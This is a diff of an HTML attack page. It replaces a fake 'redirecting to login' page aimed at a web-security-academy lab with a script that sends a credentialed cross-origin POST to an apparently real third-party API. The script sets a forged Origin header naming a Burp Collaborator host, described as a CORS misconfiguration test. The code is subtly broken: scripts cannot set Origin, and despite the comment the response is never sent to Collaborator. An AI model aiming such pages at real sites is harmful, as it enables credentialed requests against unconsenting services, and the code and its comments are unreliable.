@@ -1,18 +1,40 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Redirecting...</title>
+  <body>
     <script>
-        function redirectToLogin() {
-            // Redirect to the actual login page
-            window.location.href = 'https://0a76006804cab51f81b5c5d400c40045.web-security-academy.net/login';
-        }
+      // Create a new XMLHttpRequest
+      var xhr = new XMLHttpRequest();
+      
+      // Specify the type of request, URL, and asynchronous flag
+      xhr.open("POST", "https://quitplan.ycq2.org/api/cravings", true);
 
-        // Redirect after a short delay
-        setTimeout(redirectToLogin, 2000); // Adjust the delay as needed
+      // Set up the request to send credentials (cookies) with the request
+      xhr.withCredentials = true;
+
+      // Set the origin header to a value that you control (e.g., Burp Collaborator server)
+      // This is a key part of the CORS misconfiguration test
+      var originHeader = "https://fh00f96k3l0908nate9ximlb72dt1kr8g.oastify.com";
+      xhr.setRequestHeader("Origin", originHeader);
+
+      // Send the POST request with data (e.g., in JSON format or another required format)
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify({
+        "data": "test"
+      }));
+
+      // Handle the response (will be captured in the Burp Collaborator server)
+      xhr.onload = function () {
+        // Check if the response was successful (200 OK)
+        if (xhr.status === 200) {
+          console.log("Request successful, response received: " + xhr.responseText);
+        } else {
+          console.log("Request failed with status: " + xhr.status);
+        }
+      };
+
+      // Handle errors
+      xhr.onerror = function () {
+        console.log("Request failed");
+      };
     </script>
-</head>
-<body>
-    <h1>Please wait, you are being redirected to the login page...</h1>
-</body>
+  </body>
 </html>
